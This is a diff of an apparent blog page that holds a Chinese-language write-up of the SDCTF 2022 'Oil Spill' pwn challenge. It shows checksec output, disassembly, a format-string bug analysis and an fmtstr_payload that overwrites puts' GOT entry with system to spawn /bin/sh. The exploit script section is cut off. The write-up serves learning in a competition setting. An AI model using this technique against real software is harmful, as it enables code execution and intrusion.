@@ -15,7 +15,7 @@
   
   <link rel="canonical" href="http://mykonos-x.github.io/2022/07/05/SDCTF-2022-Oil-Spill/">
   
-  <meta name="description" content="checksecArch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main    ">
+  <meta name="description" content="checksec Arch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main   ">
   
   
   <meta name="author" content="Ez3ki3l">
@@ -26,14 +26,14 @@
   <meta property="og:type" content="article" />
   <meta property="og:title" content="SDCTF 2022 Oil Spill" />
   
-  <meta property="og:description" content="checksecArch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main    ">
+  <meta property="og:description" content="checksec Arch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main   ">
   
   <meta property="og:url" content="http://mykonos-x.github.io/2022/07/05/SDCTF-2022-Oil-Spill/" />
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="SDCTF 2022 Oil Spill">
   
-  <meta name="twitter:description" content="checksecArch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main    ">
+  <meta name="twitter:description" content="checksec Arch:     amd64-64-little RELRO:    No RELRO Stack:    Canary found NX:       NX enabled PIE:      No PIE (0x400000) 开启了Canary和堆栈不可执行 main   ">
   
   
   
@@ -193,13 +193,15 @@
         <div class="trans">
             <h2>SDCTF 2022 Oil Spill</h2>
 
-  <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little
+  <h3><span id="checksec">checksec</span></h3>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little
 RELRO:    No RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>开启了Canary和堆栈不可执行</p>
-<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">                push    rbp
+<h3><span id="main">main</span></h3>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">                push    rbp
 .text:000000000040068B                 mov     rbp, rsp
 .text:000000000040068E                 sub     rsp, 150h
 .text:0000000000400695                 mov     [rbp+var_144], edi
@@ -267,11 +269,12 @@ PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="to
   <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>程序运行输出puts，printf的地址</p>
+<h3><span id="analyze">Analyze</span></h3>
+<p>程序运行输出puts，printf的地址</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x7f699d578420, 0x7f699d555c90, 0x7ffc3135dea0, 0x400677
 Oh no<span class="token operator">!</span> We spilled oil everywhere and its making everything dirty
 <span class="token keyword">do</span> you have any ideas of what we can use to clean it?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>由于提示说本题是18.04，所以不需要用<code>LibcSearcher</code>来找libc<del>~我就是这样的傻X</del>~，只不过如果libc小版本对应不上的话还是需要<code>glibc-all-in-one</code></p>
+<p>由于提示说本题是18.04，所以不需要用<code>LibcSearcher</code>来找libc~<s>我就是这样的傻X</s>~，只不过如果libc小版本对应不上的话还是需要<code>glibc-all-in-one</code></p>
 <p>接收puts,printf地址后就可以泄露libc基址了</p>
 <p>接着程序</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -279,11 +282,12 @@ Oh no<span class="token operator">!</span> We spilled oil everywhere and its mak
 <p>有format string漏洞，且偏移为<code>8</code></p>
 <p>同时</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可以利用<code>fmtstr_payload</code>将puts的got表地址替换成system，里面的<code>x</code>替换成<code>b&#39;/bin/sh\x00</code></p>
+<p>可以利用<code>fmtstr_payload</code>将puts的got表地址替换成system，里面的<code>x</code>替换成<code>b'/bin/sh\x00</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">,</span><span class="token number">0x600c80</span><span class="token punctuation">:</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">&#125;</span>
 <span class="token comment">#fmtstr_payload中需要替换多个值时，用逗号连接，这个是我当时不知道的地方，还搞成dict了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>这样当程序执行到puts(x)时实际会执行<code>system(&quot;/bin/sh\x00&quot;)</code>，getshell</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
+<h3><span id="exp">exp</span></h3>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    Canary found
